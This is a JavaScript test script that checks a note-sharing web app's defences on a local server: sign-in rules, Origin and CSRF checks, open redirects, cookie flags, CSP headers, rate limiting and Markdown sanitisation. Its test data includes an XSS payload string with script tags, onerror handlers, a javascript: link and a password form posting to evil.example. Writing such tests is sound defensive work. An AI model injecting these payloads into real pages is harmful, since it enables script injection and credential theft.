// Security checks: starts its own server (sign-in on, links printed instead of emailed) on a temporary
// database and tries to get in without permission over HTTP and WebSocket.
// Usage: npm run build && node test/security.mjs
import fs from "node:fs";
import { chromium } from "playwright";
import { startServer, signInFetch, signInBrowser, tempDir, reporter } from "./helpers.mjs";

const PORT = 3999, BASE = `http://localhost:${PORT}`, WS = `ws://localhost:${PORT}/collab`;
const DATA_DIR = tempDir("mdshare-sec-");
const { check, finish } = reporter();
const SIGNIN = { PORT: String(PORT), DATA_DIR, ALLOWED_DOMAINS: "lab.test", PUBLIC_URL: BASE };

const get = (url, headers = {}) => fetch(BASE + url, { headers, redirect: "manual" });
const post = (url, body, headers = {}) => fetch(BASE + url, { method: "POST", body, headers: { "Content-Type": "application/x-www-form-urlencoded", ...headers }, redirect: "manual" });
const ORIGIN = { Origin: BASE };
// Resolves "open" or "rejected"
function tryWs(headers) {
  return new Promise((resolve) => {
    const ws = new WebSocket(WS, { headers });
    ws.onopen = () => { ws.close(); resolve("open"); };
    ws.onerror = () => resolve("rejected");
  });
}

// 1. Unsafe setups refuse to start
for (const [name, env] of [
  ["refuses network listen without ALLOWED_DOMAINS", { HOST: "0.0.0.0" }],
  ["refuses a malformed ALLOWED_DOMAINS", { ALLOWED_DOMAINS: "not a domain" }],
  ["refuses SMTP_URL without MAIL_FROM", { ALLOWED_DOMAINS: "lab.test", SMTP_URL: "smtp://localhost:2525" }],
  ["refuses half-configured GitHub sign-in", { ALLOWED_DOMAINS: "lab.test", GITHUB_CLIENT_ID: "x" }],
]) {
  const s = startServer({ PORT: String(PORT), DATA_DIR, ...env });
  const code = await s.ready.then(() => s.stop().then(() => 0), (e) => e.code);
  check(name, code === 1, `exit code ${code}`);
}

let srv = startServer(SIGNIN);
await srv.ready;

// 2. Signed out: nothing readable over HTTP or WebSocket
const home = await get("/");
check("home redirects to sign-in", home.status === 302 && home.headers.get("location").startsWith("/login"));
check("note list needs sign-in", (await get("/api/notes")).status === 401);
check("POST /api/notes needs sign-in", (await post("/api/notes", "", ORIGIN)).status === 401);
check("WebSocket without sign-in rejected", (await tryWs({ Origin: BASE })) === "rejected");

// 3. Sign-in requests
check("outside address refused", (await post("/auth/email", "email=eve%40evil.test", ORIGIN)).headers.get("location").includes("error=domain"));
check("sign-in request without Origin blocked", (await post("/auth/email", "email=a%40lab.test")).status === 403);
check("sign-in request from another site blocked", (await post("/auth/email", "email=a%40lab.test", { Origin: "http://evil.example" })).status === 403);
check("open redirect blocked (next=//evil.example)", await (async () => {
  const mark = srv.output().length;
  await post("/auth/email", new URLSearchParams({ email: "nx@lab.test", next: "//evil.example" }).toString(), ORIGIN);
  const link = await srv.linkFor("nx@lab.test", { after: mark });
  const r = await post("/auth/email/verify", new URLSearchParams({ token: new URL(link).searchParams.get("token") }).toString(), ORIGIN);
  return r.headers.get("location") === "/";
})());
const mark = srv.output().length;
await post("/auth/email", "email=ann%40lab.test", ORIGIN);
const link = await srv.linkFor("ann@lab.test", { after: mark });
check("sign-in links are long random one-time tokens", /token=[A-Za-z0-9_-]{43}$/.test(link || ""), link);
const verified = await post("/auth/email/verify", new URLSearchParams({ token: new URL(link).searchParams.get("token") }).toString(), ORIGIN);
const raw = verified.headers.get("set-cookie") || "";
check("session cookie is HttpOnly and SameSite", /HttpOnly/.test(raw) && /SameSite=Lax/.test(raw));
const cookie = raw.split(";")[0];
const H = { Cookie: cookie };

// 4. Signed in
check("note list readable when signed in", (await get("/api/notes", H)).status === 200);
const created = await post("/api/notes", "", { ...H, ...ORIGIN });
const { id } = await created.json();
check("create note when signed in", created.status === 201 && /^[A-Za-z0-9]{10}$/.test(id));
check("note page loads for its owner", (await get(`/n/${id}`, H)).status === 200);
check("download works for its owner", (await get(`/api/notes/${id}/download`, H)).status === 200);
check("signed-out note page redirects", (await get(`/n/${id}`)).status === 302);
check("signed-out download refused", (await get(`/api/notes/${id}/download`)).status === 401);
check("POST without Origin blocked", (await post("/api/notes", "", H)).status === 403);
check("POST from another site blocked", (await post("/api/notes", "", { ...H, Origin: "http://evil.example" })).status === 403);
const before = (await (await get("/api/notes", H)).json()).mine.length;
await get("/new", { ...H, "Sec-Fetch-Site": "cross-site" });
check("cross-site link can't create notes", (await (await get("/api/notes", H)).json()).mine.length === before);
check("WebSocket with sign-in opens", (await tryWs({ ...H, Origin: BASE })) === "open");
check("WebSocket from another site rejected", (await tryWs({ ...H, Origin: "http://evil.example" })) === "rejected");
check("WebSocket without Origin rejected", (await tryWs(H)) === "rejected");
check("forged cookie rejected", (await get("/api/notes", { Cookie: "mdshare_session=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" })).status === 401);
check("note IDs are not guessable sequence numbers", /^[A-Za-z0-9]{10}$/.test(id) && !/^\d+$/.test(id));

// 5. Headers
const h = (await get("/", H)).headers;
const csp = h.get("content-security-policy") || "";
check("CSP blocks inline scripts and framing", csp.includes("script-src 'self'") && !csp.includes("unsafe-eval") && csp.includes("frame-ancestors 'none'"));
check("CSP only allows our own WebSocket", csp.includes(`ws://localhost:${PORT}`) && !/ ws: | wss: /.test(csp));
check("pages are not cached", h.get("cache-control") === "no-store");

// 6. Browser: malicious Markdown is neutralised, and signing out cuts the live connection
const browser = await chromium.launch();
const page = await (await browser.newContext()).newPage();
const dialogs = [];
page.on("dialog", (d) => { dialogs.push(d.message()); d.dismiss(); });
await signInBrowser(page, BASE, srv, "ann@lab.test");
await page.goto(`${BASE}/n/${id}`);
await page.waitForFunction(() => window.__mdshare?.provider.isSynced);
await page.evaluate(() => {
  const t = window.__mdshare.ytext;
  t.delete(0, t.length);
  t.insert(0, '# x\n\n<script>alert(1)</script><img src=x onerror="alert(2)"><style>body{display:none}</style>' +
    '<form action="https://evil.example"><input name=pw><button>Go</button></form><a href="javascript:alert(3)">l</a><iframe src="https://evil.example"></iframe>');
});
await page.waitForTimeout(500);
const bad = await page.evaluate(() => {
  const p = document.querySelector("#preview");
  return ["script", "style", "form", "input", "button", "iframe", "[onerror]", "a[href^='javascript']"].filter((s) => p.querySelector(s));
});
check("malicious HTML stripped from preview", bad.length === 0 && dialogs.length === 0, `found ${bad} dialogs ${dialogs}`);

const other = await (await browser.newContext()).newPage(); // the same person on a second device
await signInBrowser(other, BASE, srv, "ann@lab.test");
await other.goto(`${BASE}/n/${id}`);
await other.waitForFunction(() => window.__mdshare?.provider.isSynced);
await page.evaluate(() => fetch("/logout", { method: "POST" }));
await page.waitForURL("**/login**", { timeout: 5000 }).catch(() => {});
check("signing out disconnects the open editor", page.url().includes("/login"), page.url());
check("the person's other device stays connected", (await other.evaluate(() => window.__mdshare.provider.isSynced)) && !other.url().includes("/login"));
await browser.close();
await post("/logout", "", { ...H, ...ORIGIN });
check("cookie refused after sign-out", (await get("/api/notes", H)).status === 401);

// 7. Sign-in emails are throttled (no inbox flooding, no brute force)
let last = "";
for (let i = 0; i < 4; i++) last = (await post("/auth/email", "email=flood%40lab.test", ORIGIN)).headers.get("location");
check("4th link for one address in 15 min is refused", last.includes("error=rate"), last);
for (let i = 0; i < 10; i++) last = (await post("/auth/email", `email=p${i}%40lab.test`, ORIGIN)).headers.get("location");
check("too many sign-in emails from one address (IP) are refused", last.includes("error=rate"), last);

await srv.stop();
fs.rmSync(DATA_DIR, { recursive: true, force: true });
process.exit(finish());
